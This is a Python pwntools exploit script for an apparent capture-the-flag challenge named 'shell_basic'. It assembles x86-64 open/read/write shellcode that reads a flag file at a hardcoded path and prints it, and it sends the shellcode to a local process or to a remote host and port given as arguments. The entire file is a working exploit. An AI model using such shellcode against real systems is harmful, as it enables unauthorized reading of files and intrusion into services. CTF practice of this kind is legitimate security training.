#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings
import textwrap

# Set up pwntools for the correct architecture
exe = context.binary = ELF('shell_basic')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+132
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    sc = asm("""
        cat:
             xor rax, rax
             mov al, 0x2
             lea rdi, [rip+path]
             xor rsi, rsi
             xor rdx, rdx
             syscall
             
             mov r8, rax
             xor rax, rax
             mov rdi, r8
             lea rsi, [rsp+0x500]
             mov rdx, 0x30
             syscall
             
             xor rax, rax
             mov al, 0x1
             mov rdi, rax
             syscall

        path:
             .ascii "/home/shell_basic/flag_name_is_loooooong"
             .byte 0
    """)

    io.send(sc)


    io.interactive()



def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

